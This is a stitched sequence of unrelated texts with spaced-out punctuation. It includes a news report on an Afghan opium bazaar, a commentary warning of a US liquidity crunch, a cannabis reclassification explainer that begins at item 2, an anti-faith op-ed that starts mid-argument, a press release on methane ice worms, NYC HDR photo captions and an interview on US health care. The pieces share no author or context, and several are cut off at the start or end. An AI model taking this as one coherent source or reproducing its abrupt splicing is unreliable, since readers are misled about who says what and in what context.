But in reality , this is one of Afghanistan 's biggest opium markets .
Farmers from Nangarhar and other adjacent provinces bring opium to Shaddle to sell .
Much of it comes from Nangarhar and Helmand - two of Afghanistan 's biggest opium - producing provinces .
Mud hut shop Thousands of kilos of opium are bought and sold every day .
Sitting inside the shop tension between the drug dealers is visible - for a few minutes there is hot dispute and shouting over prices and the quality of the opium before the transaction is completed .
There are big scales in the shop , and the assistant weighs the opium on it - Gul Mohammad is busy counting out Pakistani rupees to pay for the opium he has bought from one of his suppliers .
In his mud hut shop he buys hundreds of kilos of opium every day and the smell of it is everywhere .
Outside his shop vehicles come and go - green tea is served constantly for the visitors .
It 's argued that opium can be used for medicinal purposes
Enlarge Image
But you do not have to study what is going on too closely to notice the unusual - a man carries a big bag full of hundreds of thousands of Afghanis .
The dealers all carry pistols which they say is for their own protection .
Customers enter the shop bringing opium packed secretly , which they refer to by its nickname as maal .
They are constantly on the look - out for government informers .
I am repeatedly asked not to take pictures of anyone 's face , nor should I name anyone .
The names of those involved in the drugs trade in this piece have been made up to protect their identity .
" We could get killed or arrested , " says one of the few people in the shop willing to talk to me .
Europe bound Some villagers , like 18 - year - old Abdullah Jan , have to walk for hours before reaching Shaddle .
The tiredness on his face explains it all - if he is stopped by government agents or bandits he would lose money that feeds his family for the entire year .
" I left at four in the morning and got here after four hours .
I have brought 10kg of opium from my fields to sell . "
After a hard bargain with Gul Mohammad Khan , the opium dealer , he is getting the equivalent of $ 1,400 - more than he can get for any other crop .
He is one of hundreds of people who travel to Shaddle bazaar to sell and buy opium .
From here the opium is taken to the nearby mountains and villages in the border areas to heroin labs set up by local drug dealers , where it is processed into heroin .
Eventually , it will hit the streets of Europe .
The market first began to sell opium openly under the Taleban regime after they permitted the cultivation of poppies .
After the fall of the Taleban in 2001 , the market has been raided several times but it has re-opened again and again .
In recent months , Afghanistan 's elite anti-drug force has raided the bazaar with the help of foreign forces in the country - they made arrests and seized opium and heroin in large quantities .
But they did not succeed in closing down the bazaar indefinitely .
Last year , Afghanistan 's poppy production reached record levels .
The US state department 's annual report on narcotics said the flourishing drugs trade was undermining the fight against the Taleban .
Powerful mafia
It warned of a possible increase in heroin overdoses in Europe and the Middle East as a result .
Poppy production rose 25 % in 2006 , a figure US Assistant Secretary of State Ann Patterson described as alarming .
Four years after the US and its British allies began combating poppy production , Afghanistan still accounts for 90 % of the world 's opium trade .
The authorities are trying to eradicate opium crops
The US has recently given the Afghan government more than $ 10bn in assistance , but most of the money will be spent on security rather than encouraging alternative sources of income .
For 45 - year - old Gul Mohammad Khan being a opium trader is his way of surviving .
" If we had roads , clinics , factories and if there were job opportunities I would not do what I am doing now , " he said .
For the past 10 years Mr Mohammad has seen many regimes and local officials come and go .
His shop has been raided many times but he has never been arrested .
Inside , I am shown various qualities of opium and other raw material that are used to make heroin .
Current prices are anywhere from 10,000 Afghanis ( $ 201 ) for a kilo of dry opium - that is the best quality - to around 5,500 Afghanis ( $ 110 ) for wet opium .
Target traffickers
According to officials , the mafia is powerful and strong .
" They are so strong that we sometimes find ourselves outnumbered fighting them , " says Gen Daud Daud , the deputy minister of interior in charge of counter narcotics .
" In these mountains of Achin district and other border villages they have everything from heavy machine guns , rocket - propelled grenades and of course better vehicles and more money than we do . "
Haji Deen Gul - who is selling 20kg of opium - is critical of the Afghan government and the international community for targeting the farmers .
Instead he wants the traffickers to be targeted .
" They should target the ones who are selling the heroin to Western countries .
I sell my opium to feed my family and from my heroin they can even make medicine .
When I have water and roads provided to me , I will stop growing poppies . "
Before I leave Gul Mohammad Khan 's shop , he tells me selling opium is not ideally the trade he wants to be in .
" I do n't want my children to be in this trade and I hope that some day the world will help us .
Only then can we stop the opium trade . "

Last week the Dow Jones industrial average fell 4.2 % , the steepest drop since March 2003 .
Financial shares took a beating on growing evidence that problems in the sub - prime mortgage market are spreading , making financing the corporate buy - outs that drove the market 's rally more difficult .
Many financial market participants are of the view that there is a definite deterioration in credit conditions , which means less liquidity for private equity , stock buy - backs , and business expansion .
Fed officials , however , have downplayed this claim .
In an interview with the Wall Street Journal on July 24 the president of the Philadelphia Federal Reserve Bank , Charles Plosser , said that the present slump in the housing market is not going to trigger a liquidity crunch and a consequent general economic recession .
The reason for this is that banks are unlikely to curtail lending since their balance sheets are in good shape .
Plosser attributes this to financial innovations ( financial engineering ) in the last 10 to 20 years that have enabled banks to distribute much of the risk .
Plosser adds :
Does that say nothing bad can happen ?
Of course not .
But it means I 'm a little more sanguine that that whole view of a credit crunch is probably not as applicable now as it might have been 10 or 20 years ago … .
Banks in this district are pretty healthy ….
Their biggest complaint is not housing mortgage defaults and credit crunch , it 's the yield curve .
They 've got money to lend .
( Banks as a rule lend at long - term rates and raise funds at short - term rates .
Hence they prefer an upward sloping yield curve — when long - term rates are higher than short - term rates .
At present the yield curve is relatively flat , which undermines profits from lending . )
Fed officials including Plosser present the current housing slump as the outcome of irresponsible lending by mortgage brokers and various other mysterious forces .
On this logic it is the role of the Fed to monitor the situation in the housing market and , if required , to interfere in order to prevent the housing slump from spilling over to the rest of the economy .
We suggest that what we are currently observing in the housing market is the deflation of the housing bubble , which could be a precursor to a widely spread liquidity crunch .
The deflation of the bubble is the result of the Fed 's boom - bust monetary policies .
Here is why .
We define a bubble as activity that has emerged on the back of the loose monetary policy of the central bank .
In the absence of monetary pumping this type of activity would not have emerged .
Since bubble activities are not self - funded , their emergence must come at the expense of various self - funded or productive activities .
This means that less real funding is left for true wealth generators , which in turn undermines real wealth formation .
When new money is created , its effect is not felt instantaneously across all markets .
The effect moves from one individual to another and thus from one market to another .
In short , monetary pumping generates bubble activities across all markets as time goes by .
It is quite likely that the loose monetary policy of the Fed between January 2001 and June 2004 has laid the foundation for the emergence of various non-productive activities .
( The federal funds rate target was lowered from 6.5 % to 1 % . )
An easy monetary stance coupled with fractional - reserve bank lending has given rise to an abundance of money out of " thin air . "
Between Q3 2001 to Q4 2004 the average yearly rate of growth of our monetary measure AMS stood at 7.5 % .
This should be contrasted with the rate of growth of 2 % in Q2 2001 and 0.9 % in Q4 2000 .
The illusory prosperity that the bubble activities have generated in fact amounted to the consumption of real savings and to a weakening of the pool of real funding — the heart of real economic growth .
Since June 2004 the Fed has reversed its monetary stance .
The fed funds rate target was raised from 1 % to 5.25 % currently .
In response to this the growth momentum of our monetary measure AMS has been in visible downtrend since Q4 2004 .
The yearly rate of growth fell from 7.1 % in Q4 2004 to 1.4 % in Q2 2007 .
Once the Fed tightened its stance this started to undermine various activities that emerged on the back of the previous loose monetary stance .
In short , these activities have come under pressure .
We have seen that the effect of changes in money supply ( i.e. , creating and supporting various non-productive activities ) on various markets operates with a variable time lag .
As a result of this , the effect from past changes in money supply can continue to assert its dominance notwithstanding more recent changes in the money supply .
( Past loose monetary policies can still provide support to various bubble activities despite more recent tight monetary stance . )
We suspect that the tighter stance since June 2004 is only now starting to gain momentum with the housing market being hit first .
This means that sooner or later the various other parts of the economy are likely to exhibit difficulties .
In short , the fall in the growth momentum of money is going to put pressure on activities that sprang up on the back of previous loose monetary policy .
( Remember that bubbles are supported by means of loose monetary policy that diverts real funding from wealth generating activities .
Once the money rate of growth slows down , this slows the diversion of real wealth , i.e. , slows down the support for these activities . )
When various non-productive activities start to deflate , this tends to exert a direct and indirect effect on the quality of bank assets notwithstanding financial innovations .
Obviously once this happens banks tend to curb their lending growth .
Does this imply that the United States is heading for a serious liquidity crunch and severe economic slump ?
We suggest that this will be dictated by the state of the pool of real funding .
If the pool of real funding is still growing then commercial banks are unlikely to curtail their lending — at the worst , they might reduce the rate of lending expansion .
This means that instead of being liquidated , various false activities might be forced to slow down their pace of expansion .
Obviously , if commercial banks were to significantly curtail their lending then this could be indicative that the pool of real funding at the disposal of Americans is in trouble .
Should commercial banks trim their lending it is likely to lead to a fall in money supply and to a liquidity crunch , all other things being equal .
For the time being , overall commercial bank lending is still expanding although at a slower pace .
After climbing to 11 % in November last year the yearly rate of growth fell to 8.3 % so far in July .
( In the week ending July 18 , bank loans increased by $ 23.3 billion . )
Another possible source for a liquidity crunch is the Fed 's policy of targeting the federal funds rate .
In the week ending July 25 , the Fed 's balance sheet ( also called Fed Credit ) fell by $ 3.669 billion .
The yearly rate of growth fell to 2.7 % from 3.1 % in June and 4.2 % in March .
The decline in the pace of monetary injections by the Fed could be indicative that the current fed funds rate target of 5.25 % is too high relative to economic activity .
In short , a weakening in economic activity puts downward pressure on interest rates .
To protect the target of 5.25 % the Fed is forced to slow down its monetary pumping .
It follows that liquidity could come under severe pressure if the Fed decides to cling to the current fed funds rate target whilst the economy is weakening .
We can thus conclude that as the effect of the tighter monetary stance of the Fed since June 2004 gains strength the chances for a widely spread liquidity crunch are rising .
The entire issue could further exacerbate should the Fed cling to the current fed funds rate target whilst the economy is weakening .
2 . The home secretary , David Blunkett , has decided to downgrade cannabis from class B to class C .
3 . Former drugs tsar and part time drug adviser to the government , Keith Hellawell , has resigned in protest .
4 . So what 's all the fuss about ?
Cannabis was first cultivated in central Asia .
The earliest records show that the Chinese were using the plant for its fibrous stalks ( called hemp ) as far back as 2800 BC .
Later it spread to the Mediterranean under the Romans and , much later , on to northern Europe and the Americas .
5 . The leaves , especially those of the female plant , contain the active ingredient tetrahydrocannabinol that give marijuana and hash ( a concentrated resin ) their special properties .
6 . Its narcotic effects have made cannabis illegal in many parts of the world .
7 . An exception is the Netherlands where the plant 's use is decriminalised and , it is believed , many varieties that reach Britain are intensively farmed .
8 . For the organic varieties you need to grow your own but - be warned - in a lot of countries this is illegal too .
9 . Some groups campaign for legalisation in the UK .
Former cannabis users are now to be found in many walks of life .
For example , the top echelons of the Tory party .
10 .
Despite the recent debate , the art of cannabis cultivation is unlikely to be featured on Gardener 's World any time soon .
Possession of the drug still carries a maximum two - year penalty , while possession with intent to supply could land you with up to five years in the slammer .
However , what has fairly ripped my knitting in the weeks since has been the concerted efforts to give religion an alibi for the whole undertaking , depicting it as merely misused by extremists and clinging to the idea that faith itself is a virtue , all the while ignoring the very simple equation that no belief in an afterlife equals no suicide bombers .
As Voltaire put it , once you can get men to believe in absurdities , you can get them to commit atrocities - and nobody has proved his point more vividly than those carrying out what is literally the ultimate act of faith .
The notion that faith - belief in spite of an absence of proof or even in the face of compelling contrary evidence - is a form of mental and moral fortitude needs not merely to be challenged , but to be given the full point - and - laugh treatment , so that we can see afresh how this absurdity deserves ridicule rather than reverence .
My new novel , Attack of the Unsinkable Rubber Ducks , takes its name from a coinage of the magician and sceptic James Randi to describe people who , no matter how much proof you try to submerge them in , always bob back up again with a new reason to keep believing .
The liberal consensus - one I subscribe to - is that people should be free to believe whatever they like .
However , with freedom always comes responsibility , and thus people should be responsible enough to avail themselves of the facts and , where necessary , adjust their beliefs accordingly .
To illustrate , the book deals principally with belief in the idea that it is possible to communicate with " the other side " , a notion that has intermingled with modern Judeo - Christian faith in an afterlife .
It remains a very popular belief : even otherwise rational people , while scorning Derek Acorah and what they perceive to be the cheesier end of mediumship , will none the less say they think there must be something behind spiritualism .
There is : it 's called the phalangeal joint , and the disparaged " cheesy end " is in fact the centre , the root and the whole of spiritualism .
The modern concept of mediumship began in 1848 , in Hydesville , New York , the product of two pubescent sisters , Margaret and Kate Fox , who exploited a shared ability to crack their toe joints against wooden floorboards to create rapping sounds that put the wind up their highly superstitious mother .
The two girls soon found themselves the centre of unprecedented attention .
Their much older sister , Leah , took one look at her younger siblings ' antics and saw dollar signs .
She swiftly founded a Society of Spiritualists in order to add gravitas and mystique to a series of profitable public performances .
Leah took her sisters on a grand tour of American cities , but spiritualism was spreading far faster than the steam trains could carry it , with imitators and variants rapidly staking their claims .
The younger Fox sisters found themselves clinging to a rising balloon , their silly wee prank now a quasi-religious cause attracting such celebrity adherents as the late president 's widow , Mary Todd Lincoln , and even Sir Arthur Conan Doyle .
Despite the altitude , on October 21 1888 , Margaret let go .
That evening she gave a lecture at New York 's Academy of Music , having earlier in the day published an article in which she confessed the truth .
The 2,000 spiritualists present angrily jeered her , not for having deceived them , but for her " lies " in the article .
Margaret 's submission of hard contrary evidence did nothing to prevent the spread of the movement and associated beliefs .
One of those was Helena Blavatsky 's cult of theosophy , which used its supernatural mystique as an underpinning for a racial mythology in which a group called " the Aryans " were " the Race of Hope " .
This was seized upon by Nazi theorists , including Heinrich Himmler .
An extreme example ?
Go back and read again what Voltaire said regarding absurdities and atrocities .
All of this from two little girls trying to scare their mother with their percussive toes .
The story of the Fox sisters and the rise of spiritualism illustrates that belief in the face of the evidence is at best a retreat into intellectual infantilism , and at worst dangerously irresponsible .
The Glasgow would - be bombers believed faith itself was a virtue , a sufficient reason to murder hundreds of innocent people .
I do n't think being nine hours too early on June 30 disqualifies me from saying that such faith is a self - indulgence we can ill afford .

Scientists Discover Methane Ice Worms On Gulf Of Mexico Sea Floor
Press Release From : Pennsylvania State University
Posted : Tuesday , July 29 , 1997
A team of university scientists using a mini research submarine on a NOAA - funded research cruise has discovered , photographed , and sampled what appears to be a new species of centipede - like worms living on and within mounds of methane ice on the floor of the Gulf of Mexico , about 150 miles south of New Orleans .
Although scientists had hypothesized that bacteria might colonize methane ice mounds , called gas hydrates , this is the first time animals have been found living in the mounds .
The discovery of dense colonies of these one - to - two - inch - long , flat , pinkish worms burrowing into a mushroom - shaped mound of methane seeping up from the sea floor raises speculation that the worms may be a new species with a pervasive and as yet unknown influence on these energy - rich gas deposits .
The worms were observed using their two rows of oar - like appendages to move about the honeycombed , yellow and white surface of the icy mound .
The researchers speculate that the worms may be grazing off chemosynthetic bacteria that grow on the methane or are otherwise living symbiotically with them .
" The old view that the deep sea bottom is a monotonous habitat needs to be discarded .
These worms are the major players in a new and unique marine ecosystem , " said expedition Chief Scientist Charles Fisher , an associate professor of biology at Penn State , who discovered the methane ice worms in waters 1,800 feet deep in the submersible Johnson Sea Link with sub pilot Phil Santos of the Harbor Branch Oceanographic Institution .
The scientists have also managed to keep a number of the exotic worms alive in shoreside laboratories for further study .
" These are not just another common worm in the mud .
We now know that these higher - order organisms can live right on methane hydrates .
If these animals turn out to be ubiquitous on shallow seafloor gas deposits , possibly worldwide , they could have a significant impact on how these deposits are formed and dissolve in seawater and on how we go about mining or otherwise harvesting this natural gas as a source of energy , " Fisher said .
" It 's very cool that while we 're busy speculating about life on other planets we continue to discover new forms of life in the most unlikely habitats on Earth , " commented Erin McMullin , a Penn State graduate student and a member of the research expedition that discovered the methane - ice worms .
Methane ice , a gas hydrate , forms naturally at the high pressure and low temperature of the deep sea , but is usually buried deep in marine sediment .
The Gulf of Mexico is one of the few places where hydrate can be found exposed on the ocean bottom .
Occasionally this seeping , solid methane bursts through in mounds , often six to eight feet across .
The first leg of the ten - day expedition , which ended July 19 , was carried out aboard the Harbor Branch Research Vessel Edwin Link and sponsored by the NOAA National Undersea Research Center at the University of North Carolina at Wilmington and the Minerals Management Service of the U.S. Department of the Interior .
In addition to Chief Scientist Charles Fisher , principal investigators included Ian MacDonald of Texas A&M University , Robert Carney of Louisiana State University , Steve Macko of the University of Virginia , and Alissa Arp and David Julian of San Francisco State University .
A second leg of the expedition , sponsored by MMS and NOAA , continues through August 1 .

72nd and Amsterdam
This is a five exposure HDR image I took on the corner of 72nd and Amsterdam facing south east , in NYC .
This was a tripod shot on my Olympus SP - 350 .
I desaturated the image to give it a slightly more grungy feel of the city .
Looking up 8th Avenue
Three exposure HDRI looking up 8th .
Ave .
The building being constructed in the middle is the new New York Times building in Times Square .
This photograph was taken on a window sill to stabilize the camera as there was n't room for a tripod .
Manhattan Municipal Building
Three exposure HDRI looking east at the Manhattan Municipal Building , downtown , New York City .
I wish I took one more exposure even darker as I 'm still getting some blowout in the cloud highlights , but it was a really sunny day .
The Skyscraper Museum
This is a three exposure HDRI taken at the entry way to the Skyscraper Museum , located downtown New York City .
It 's a very small museum but the architecture is quite beautiful .
When this image was taken there was an exhibit of the World Trade Center Twin Towers and their construction .
Apartments
Three exposure HDRI of some apartments taken from a rooftop .
This was taken with my Olympus SP - 350 digital camera on a tripod
WTC7
This is an HDRI of the newly opened 7 World Trade Center ( WTC7 ) .
The new WTC7 building officially opened on May 23rd , 2006 .
The red sculpture seen further down in this collection is right outside of this building .
WTC7 is ( as of it 's opening ) considered the safest skyscraper in the USA and is NYC 's first ‘ Green ’ building .
72nd Street Entrance
Three exposure HDRI of the southern subway building at 72nd St. on the 1 , 2 , 3 line .
This is the older of the two buildings .
The newer building can be seen in this collection as well .
Looking down 8th ( tilt - shift )
Shot looking down ( south ) 8th Ave. in NYC .
8th Ave. is the long street to the right of the frame .
Three exposure HDRI shot on my Olympus SP - 350 .
This image has some post processing to simulate a tilt - shift lens .
This type of effect gives the photograph the feeling that it is a picture of a small miniature model .
79th Street Uptown
This is a three exposure HDR image taken in the 79th St. subway station in Manhattan ( NYC ) , looking uptown .
I shot this on my tripod set really close to the ground to bring the eye much closer to the floor ( as dirty as it is ) .
You can see the downtown train leaving the station on the far left of the image .
1 2 3 at 72nd Street
This is a five exposure HDR image taken of the 72nd Street subway entrance on the 1 , 2 , 3 line in NYC .
This was taken on a tripod on my Olympus SP - 350 digital camera .
I used a few more exposures to create this image to help blend the pedestrians as they walked by .
The Skyscraper Museum ( 2 ) This is a three exposure HDRI taken at the Skyscraper Museum , located downtown New York City .
It 's a very small museum but the architecture is quite beautiful .
When this image was taken there was an exhibit of the World Trade Center Twin Towers and their construction .
Water Tower
Three exposure HDRI of the water tower on the top of my apartment building .
I saw that a storm was about an hour or so away , so I ran up onto the roof to take this picture .
It started to rain about ten minutes after I took the photos .
Turbulent clouds like these always make interesting subjects , especially with HDR / tone mapped images .
The Ansonia
Three exposure HDRI of The Ansonia an Upper West - Side Beaux - Arts style building built in 1899 - 1904 .
The building was named after Anson Green Phelps and at one point Babe Ruth and Arturo Toscanini lived there .
It has an interesting history .
Penn to Empire
This is one of my favorite photos of the NYC skyline .
One Penn Plaza is on the left and the Empire State Building is on the right side of the image .
The large building in the front is the Fashion Institute of Technology ( FIT ) .
This is a three exposure HDR .
The building being constructed on the far left is the new New York Times building .
Boats in Lincoln Center
This is a shot of a boat sculpture that was in Lincoln Center in New York from July 5th through September 4th , 2006 .
Three exposure tripod shot .
The artist is Nancy Rubins and the title of the sculpture is Big Pleasure Point
Support
This is a three exposure tripod HDR image of the support structure for the sculpture seen in the above image .
Typically very reflective and glossy objects look very other worldly as the tone mapping process balances out all the bright and dark areas in the reflections .
Looking down 8th
Shot looking down ( south ) 8th Ave. in NYC .
8th Ave. is the long street to the right of the frame .
Three exposure HDRI shot on my digital camera .
This was another time that a storm was not too far away , and thus made it a great time to capture some stormy clouds .
City Hall Park Five exposure HDRI of the fountain in City Hall Park in lower Manhattan .
This is another image where I chose to use five exposures rather than the typical three exposures I use to get the moving people in the park to blend in more .
Graffiti
Three exposure HDRI with some post work done in Photoshop .
The wall was on the side of a parking lot in SoHo .
The HDR and tone - mapping process have a tendency to over saturate photos .
I 'm not really a huge fan of the images that are super saturated like that .
In this image I left the graffiti fairly saturated but then I went in and desaturated the rest of the image .
Old Police Building
Three exposure HDRI of the Old Police Building Condos .
This is a Edwardian Baroque style building built in 1909 .
The NYC Police moved out in 1973 and it was converted to luxury apartments in 1987 .
That 's New York City for you !
African Burial Ground
Three exposure HDRI .
This is the medallion marking the African Burial Ground in lower Manhattan .
The actual memorial was completed and can be found on the opposite corner less than a block away from the medallion .
The text and the map on the medallion contain more informaion .
Missing our towers Looking downtown , through Chelsea .
Three exposure HDRI .
This was during a day of rain showers .
Two towers are missing in the distance in the photo , but not from our hearts .
Regina Herzlinger is not afraid to call them as she sees them .
And what she sees looking at the American health care industry is a bunch of killers .
Not only are hospitals , insurers , employers , Congress , and academics killing health care , they are also killing real patients , she asserts in a new book , Who Killed Health Care ?
We asked Herzlinger , the Nancy R. McPherson Professor of Business Administration Chair at the Harvard Business School , to discuss her latest work and her more than 30 years of research in the health care industry .
Sean Silverthorne :
Why write this book now ?
Regina Herzlinger : I 've had it .
[ Laughs . ]
Just had it !
You know , I did my doctoral thesis really by accident in a hospital .
That was in 1971 , 36 years ago .
And at the time , I was astonished at how mismanaged that hospital was and how the most rudimentary kinds of business processes — good accounting systems , good scheduling systems , ways of responding to the customer — were totally absent .
And on the other hand , the science and the doctors were so awesome .
I went to MIT — I 'm not a great scientist , but I know it when I see it .
You knew that they were on the verge of a real breakthrough in the science , but it was coupled with this delivery system that was , wittingly or not , heartless .
And I 've been at it since then .
I wrote Market - Driven Health Care , which was a very popular book .
But the part of it that I thought was the most important , which is the restructuring of the health care delivery system around the needs of human beings , not around the needs of the status quo , did n't happen .
Consumer - Driven Health
Care was another book that I wrote to help change the demand for health care , to get innovation in the insurance industry .
That was more effective in launching new high - deductible products .
I do n't think in any of these cases I launched a revolution , but I think I was helpful .
But the pace was so slow , and people were saying that these high deductibles represented consumer - driven health care .
It 's ridiculous .
Consumer markets have lots of choice .
I thought I 've got to lay out just how self - serving this system is .
Q : What strikes me about this book , and I think anyone who 's going to read it , is the tone .
You 're actually calling players in the health care system " killers " ?
It 's more like a manifesto , a call to action .
Is that deliberate ?
A : Yes .
When I was a young girl , my mother gave me a copy of The Jungle by Upton Sinclair .
I was very struck by that book .
I find the writing , in retrospect , really wretched , but the kind of passion that said , " Here is an awful system , " was pivotal in getting food and drug laws on the books .
Q : What about the timing ?
Could you have written this book when you were writing Market - Driven Health Care ( 1996 ) or Consumer - Driven Health Care ( 2004 ) ?
A : I think at the time of Market - Driven Health Care , people were still delirious about the prospects of managed care .
Some believed that the cure , the silver bullet , was this technocratic , top - down oversight of the health care system , as opposed to something organic , entrepreneurial .
What I did in Market - Driven Health Care was to say , this emperor has no clothes .
Managed care is just not working .
But to say that the whole system is dysfunctional would have been laughable at that time .
There 's always a tipping point , and we 've hit the tipping point here .
I 've read reviews of Michael Moore 's Sicko .
I have n't seen it as yet .
But what strikes me is that his diagnosis and my diagnosis are very similar .
He diagnoses the same problems — heartless , insensitive , greedy , self - serving status quo— but his cure is a government - run system , I gather from hearsay .
I agree with the diagnosis , but my cure is , yes , everybody should have health insurance , but they should control it for themselves .
It should be run by the people , not by the government .
I 'm an economist ; I take economics very personally .
My own view is that the economic consequences of our present health care system are disastrous and grievously injure the economy .
It 's not getting any better , and none of the cures work .
Q : What your book points out is that all the players and other parts of the system are interdependent .
And although you may have a great doctor with the best intentions , the system may not allow him or her to give the quality of care they would like to .
A : Absolutely .
My heart really goes out to physicians nowadays .
They 're like little hamsters running on a track , and they 're measured for their productivity , how many people they see .
They have lousy information systems to back them up .
And then they have a public policy establishment that more or less continuously deprecates their ideas and squeezes down their income .
Not a great occupation to be in .
Q : I wonder if your personal experiences with the health care system went in the book .
A : Oh , I remember the birth of my daughter , who 's now a doctor .
I had a very long labor with her .
My obstetrician , a lovely man , was giving me a hormone called pitocin to accelerate the contractions .
And I said to him , " I do n't want this . "
" I 'm very strong , I can handle this . "
And he said , " Well , you can't make an omelet without breaking eggs . "
And I thought , " Oh , could you have a more disgusting analogy for a woman who 's giving birth ? " I was appalled .
I was in the middle of labor .
It 's very painful — labor is the right word — and I had to negotiate about this .
That experience gave me a sense that you can't be a passive person , even with the best of physicians .
You have to understand what 's going to happen and to negotiate about all the possible twists and turns ahead of time rather than when you 're lying there in the labor room .
When I got home , I got a bill .
I had never made it to the delivery room — pitocin acts suddenly .
But I had a charge for the delivery room on my bill .
And I called the clerk at the hospital who said , " Why are you even bothering ?
You 're not paying for this . "
I had another epiphany .
Of course I 'm paying for this .
We 're all paying for this .
Q : You devote 5 chapters to 5 health care players that you actually call " killers . "
They are the hospitals , health insurers , employers , U.S. Congress , and academics .
How do they all interact to make this such a bad or unresponsive or inefficient system ?
A : I think there is a big 3 here , an iron triangle , and those are the hospitals , the insurers , and the government .
They want power .
It 's very understandable .
Everybody wants to be powerful , and the way they will be powerful is to institutionalize their role in the system .
The insurers would love for a private health insurance system to remain .
I , too , think that 's very important , but the easy way for it to remain is to offer just one product .
If you offer a lot of products , suddenly you 're in actuary land .
You 're in a real risky business .
So they 've done a lot to maintain just one product .
Hospitals want to control the health care delivery system , and they 've become oligopolists or monopolists in many markets , thus obviating price and quality competition , and they 've become vertically integrated by hiring physicians and using them .
Initially the hospital was a place almost like a hotel or an office , a kind of ancillary place for the doctor .
The doctor was the star .
But increasingly , the hospitals have won the power struggle , and the physicians are more or less the blue - collar workers .
And then the government .
Whether Democrat or Republican , power is seductive , and they are actually practicing medicine … by micromanaging the payment system .
I tell the story in the book about how Congress motivated clinics and doctors with its payment formulas to use more of the antianemia substance epo .
How can the U.S. Congress — and I admire the people in all of these institutions — but how can 100 senators possibly know what a doctor in Dubuque , Iowa should receive for removing a mole ?
So these 3 are the iron triangle , and they 've got all the power in their hands .
They 're abetted by the academics who , in a market - oriented system , are not going to be very powerful , but in a centralized , technocratic system , will be very powerful , because somebody has to do the research that informs all of this .
The final group is the human resource people in corporations .
They turn to limiting the choice of health care programs for employees as a solution , the belief that big is beautiful and will result in lower costs .
Very poor idea , but in a way I 'm the most sympathetic to this group .
Suddenly human resource managers are asked to look into the bowels of this $ 2 trillion system and figure out how to make it simultaneously more effective and efficient .
Is that insane , or what ?
Q : But to say these groups are killing their patients is pretty strong language .
A : Well , 300,000 people die every 3 years in hospitals , not with the problems that brought them in .
What killed these 300,000 people ?
It 's almost comic , and just a hairline removed from a tragedy .
For example , you come in with a hammer toe , next thing you know you 're dead .
What happened ?
Well , " failure to rescue " is a big one .
Something happened to you , your respiration got compromised , you could n't breathe , and they did n't get to you in time .
Infection is another reason .
In a hospital , the scope of work is so broad that the possibility of cross-infection is monumental .
If you go into a general hospital , there 's no way they can keep those walls and floors clean and free from all bacteria .
Plus , the people who work in these settings are stressed and confused .
You and I , we have very focused jobs .
But if you 're a nurse in a hospital , you 're dealing with hundreds of different cases constantly .
It 's tremendously stressful .
Every single care event is de novo .
So of course , hospitals kill people .
Q : One of the hospitals and health care providers mentioned often in your book is Kaiser Permanente in California , which started out as a very innovative , customer - focused institution that at some point " lost its soul , " as you write .
What does the Kaiser story tell us ?
A : It tells us that it would be great if we had a health care system that would permit Kaisers and other innovations and entrepreneurs in health services to spring up .
But we do n't .
I have an acquaintance , Garrison Bliss , who is a Harvard Medical School doctor , and his brother - in - law is Norman Wu , a software guy who went to the MBA program .
They created a system to bring concierge medicine to the uninsured and the middle class .
For $ 70 dollars a month , you get 24/7 access to a doctor .
And the reason I told you about who they are is this is not naïve or idealistic — this is a team that can execute .
They 're bankable .
But the insurance industry charged that they were insurers and that they should be regulated the way insurers are regulated .
Those words , insurance regulation , that 's like striking a knife into the heart of an entrepreneur .
It means you need a huge finance department to fill out forms , and so they hired a lobbyist just to deflect it .
My point is , if Garfield and Kaiser were alive today , I do n't know how the hell they would get this idea started .
The other point is that the health care system policy thinking is dominated by the idea of economies of scale .
But there are diseconomies of scale .
You get too big and you lose touch with the core of what made you great .
I think that 's what happened to Kaiser .
Q : Your HBS colleague , Richard Bohmer , talks favorably about clinics now sprouting up in malls and big chains that offer very basic services at affordable prices .
Is that a sample of innovation now starting to take root ?
A : It 's also about why innovation in health care is so hard .
About 20 years ago , I did a series of cases on a retail health clinic called Health Stop .
It was at the mall , and I thought it was great .
The idea was , just like these guys now , you 're sick , we 're quick .
Rather than going to an emergency room for your child 's earache , you could go there .
And because they were a chain , they were a business ; they had very advanced processes like very good information systems .
Health Stop grew to be a $ 100 million company .
But these guys were run out of business by the hospitals and by the community physicians who attacked them relentlessly .
So what makes the current mode of innovation , the MinuteClinic , the Ready Care Clinic , feasible today ?
They 've got very powerful protectors .
They 're housed in Wal - Mart .
They 're housed in Target .
These guys have got very powerful allies who have very good business reasons for making it happen .
But it took 20 years for this to happen .
Q : There 's an interesting phenomenon going on , and that 's basically outsourcing fairly complex surgeries to India for much cheaper prices .
Does this actually pose a threat to the institutionalized health care system at some point ?
A : Not yet .
I have 3 student teams who focused on this , and their analysis was that employers are very worried about sending their employees to India , so they 're unlikely to ask their insurers to offer India or Thailand as an option .
It 's the human resource person , not the CEO , making this decision .
So this poor human resource person says , " Oh my God , if I have an insurance policy that says you can go to Thailand or India for surgery , and something goes wrong , I 'm going to be on the front page of The New York Times for outsourcing surgery . "
If you can't get the employers to buy in , the insurers are not going to do it independently .
On the other hand , I 'm sure it 's going to happen .
There are four big hospital companies in India , and I 've talked with their CEOs , with these teams of students .
They 're very focused on this market .
And one of the things they 're all doing is getting accredited , so that the fear that they do n't meet the standards of U.S. hospitals will be minimized .
Of course , the accreditation agency is a creature of the hospital system , so how much protection do you really get from that ?
But they will have the same kind of accreditation as the American hospitals .
Some of them have a fabulous strategy , and that is they 're very specialized .
Rather than build a 1,000 - bed hospital , they have hub - and - spoke systems .
Hub is for trauma , and spoke are specialized hospitals that deal with specialized needs .
They have a fundamentally different delivery system , and the reason they can have it is they 're not dealing with the status quo that mashes down every kind of innovation .
Q : Well , that 's the next subject I want to get to , which is innovation and entrepreneurship , which you say are sadly lacking in the health care system .
There are no Bill Gates - or Michael Dell - type innovators in health care .
Why do n't we see more entrepreneurship , more innovation , outside of technological innovation in the system ?
What 's stamping down on that ?
A : This iron triangle , it kills you .
So first of all , if we want to start a health delivery innovation , we need to get paid .
The consumer 's not paying us .
It 's these third parties operating either through the government or an insurance company that 's paying .
We would need a code .
A code comes from the AMA [ American Medical Association ] .
Will the AMA give us a code ?
Well , not easily , because the doctors are all competitive with each other .
So that 's a barrier to begin with .
Then we need a coverage decision .
The insurer or the government will say , I 'm going to cover him , but I 'm not going to cover Martha .
That takes 1 year , 2 years , 3 years .
And then they tell us what the price is going to be .
We have no negotiating power in this unless we are a lifesaving technological innovation , which is how the biotechs and some of the medical devices can get through these hurdles .
But for a health service innovation , the payment hurdles are so massive it 's masochistic .
